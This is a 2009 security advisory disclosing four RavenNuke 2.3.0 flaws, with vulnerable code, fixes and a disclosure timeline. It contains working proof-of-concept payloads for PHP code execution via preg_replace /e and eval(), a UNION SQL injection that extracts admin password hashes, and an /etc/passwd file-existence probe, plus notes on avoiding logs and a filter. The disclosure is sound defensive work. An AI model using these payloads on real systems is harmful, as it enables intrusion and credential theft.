@@ -1,0 +1,231 @@
+[waraxe-2009-SA#072] - Multiple Vulnerabilities in RavenNuke 2.3.0
+===============================================================================
+
+Author: Janek Vind "waraxe"
+Date: 16. February 2009
+Location: Estonia, Tartu
+Web: http://www.waraxe.us/advisory-72.html
+
+
+Description of vulnerable software:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+RavenNuke is a web-based automated news publishing and content management
+system based on PHP and MySQL. The system is fully controlled using a web-based
+graphical user interface (GUI). RavenNuke is an extensively changed fork of 
+the phpNuke\portal system.
+
+http://ravenphpscripts.com/
+
+
+List of found vulnerabilities
+===============================================================================
+
+1. Remote Php Code Execution in "avatarlist.php"
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Security risk: High
+
+Reasons:
+  1. uninitialized arrays "patterns" and "replacements"
+Preconditions:
+  1. attacker must be logged in as user
+Comments:
+  1. Exploit is using "preg_replace" e-modifier
+  2. "register_globals" setting does not matter
+  3. Sentinel will not stop this exploit
+  4. POST method will leave clean logs in most real-world cases
+
+Test using GET method:
+
+http://localhost/ravennuke230/modules.php?name=Your_Account&op=avatarlist
+&avatarcategory=gallery&patterns[6]=/a/e&replacements[6]=phpinfo()
+
+Test using POST method:
+------------------------------------------------------------
+<html><body><center>
+<form action="http://localhost/ravennuke230/modules.php?
+name=Your_Account&op=avatarlist" method="post">
+<input type="hidden" name="avatarcategory" value="gallery">
+<input type="hidden" name="patterns[6]" value="/a/e">
+<input type="hidden" name="replacements[6]" value="phpinfo()">
+<input type="submit" value="Test!">
+</form>
+</center></body></html>
+------------------------------------------------------------
+
+Fragment of vulnerable source code:
+------------------------------------------------------------
+$patterns[0] = '/\.gif/';
+$patterns[1] = '/\.png/';
+...
+$replacements[1] = '';
+$replacements[0] = '';
+...
+$entryname = preg_replace($patterns, $replacements, $entry);
+------------------------------------------------------------
+
+Solution: initialize arrays before use.
+
+
+2. Remote Php Code Execution in "Your Account" module
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Security risk: medium
+
+Reasons:
+  1. insecure use of "eval()" php function
+Precoditions:
+  1. Attacker must have admin rights for "Your Account" in
+  order to change custom fields
+Comments:
+  1. This is privilege escalation vulnerability
+
+Test:
+
+1. log in as admin and go to "Custom Fields" in users administration:
+
+http://localhost/ravennuke230/admin.php?op=yaCustomFields
+
+2. insert "_Z;phpinfo()" (without quotes) into input box "ID Field Name"
+
+3. click "Save fields"
+
+4. now go to "Users":
+
+http://localhost/ravennuke230/admin.php?op=yaUsers
+
+and select "User Details" for any user, click "OK".
+Resulting page will display output of the "phpinfo()", done  :) 
+
+Fragment of vulnerable source code:
+-------------------------------------------------------
+/* Get Custom Fields and display them in desired order
+...
+$result = $db->sql_query('SELECT * FROM ' . $user_prefix . '_users_fields
+ WHERE need <> "0" AND public="1" ORDER BY pos');
+...
+while ($sqlvalue = $db->sql_fetchrow($result)) {
+  if (substr($sqlvalue['name'], 0, 1) == '_') 
+@eval('$name_exit = ' . $sqlvalue['name'] . ';');
+-------------------------------------------------------
+
+
+3. Sql Injection in "Resend_Email" module
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Security risk: medium
+
+Reasons:
+  1. Insecure use of "extract()" php function
+Preconditions:
+  1. attacker must be logged in as admin
+
+Comments:
+  1. This is privilege escalation vulnerability
+  2. POST method will leave clean logs in most real-world cases
+
+Test using POST method:
+------------------------------------------------------------
+<html><body><center>
+<form action="http://localhost/ravennuke230/modules.php
+?name=Resend_Email" method="post">
+<input type="hidden" name="user_prefix" 
+value="nuke_users_temp WHERE 1=2 UNION SELECT 1,2,
+CONCAT_WS(0x3a,aid,name,radminsuper,email,pwd),4,5,6,7,8 FROM nuke_authors-- ">
+<input type="submit" value="Test!">
+</form>
+</center></body></html>
+------------------------------------------------------------
+
+Fragment of vulnerable source code:
+------------------------------------------------------------
+if (!is_admin($admin)) endit(_ACCESSDENIED);
+...
+extract($HTTP_POST_VARS);
+...
+$result = $db->sql_query('select user_id, username, user_email, user_password,
+user_regdate, check_num, time, requestor from '.$user_prefix.'_users_temp');
+------------------------------------------------------------
+
+Solution: use EXTR_SKIP to avoid overwriting of existing variables
+
+
+4. Remote Detection of Local Files in "captcha.php"
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Security risk: low
+
+Reasons:
+  1. uninitialized array "aFonts"
+Preconditions:
+  1. "register_globals=on"
+  2. "display_errors=on"
+Comments:
+  1. multiple page refreshes may needed because of source code specifics
+  2. same method works for remote directories too!
+
+Attacker is able to detect existance of remote files or directories
+via different error messages, emitted by php.
+
+Test 1:
+
+http://localhost/ravennuke230/images/captcha.php?aFonts[]=/etc/waraxe
+
+Result:
+
+Warning: imageftbbox() [function.imageftbbox]: Invalid font filename in
+C:\apache_wwwroot\ravennuke230\includes\class.php-captcha.php on line 298
+
+"Invalid font filename" --> file does not exist
+
+One more possible error message:
+
+Warning: imageftbbox(): Could not find/open font in ...
+
+"Could not find/open font" --> file does not exist
+
+
+Test 2:
+
+http://localhost/ravennuke230/images/captcha.php?aFonts[]=/etc/passwd
+
+Result:
+
+Warning: imageftbbox() [function.imageftbbox]: Could not read font in
+C:\apache_wwwroot\ravennuke230\includes\class.php-captcha.php on line 298
+
+"Could not read font" --> file exists
+
+
+How to fix:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Upgrade to new version 2.30.01
+
+
+Disclosure Timeline:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+01/16/09 Developer contacted
+01/16/09 Developer's initial response
+01/17/09 Fidings sent to developer
+02/15/09 Patched version 2.30.01 released by developer
+02/16/09 Public disclosure
+
+
+Greetings:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Greets to ToXiC, y3dips, Sm0ke, Heintz, slimjim100, pexli, mge, str0ke,
+to all active waraxe.us forum members and to anyone else who know me!
+
+
+Contact:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+come2waraxe@yahoo.com
+Janek Vind "waraxe"
+
+Waraxe forum:  http://www.waraxe.us/forums.html
+Personal homepage: http://www.janekvind.com/
+
+---------------------- [ EOF ] ------------------------------
+
+# milw0rm.com [2009-02-16]
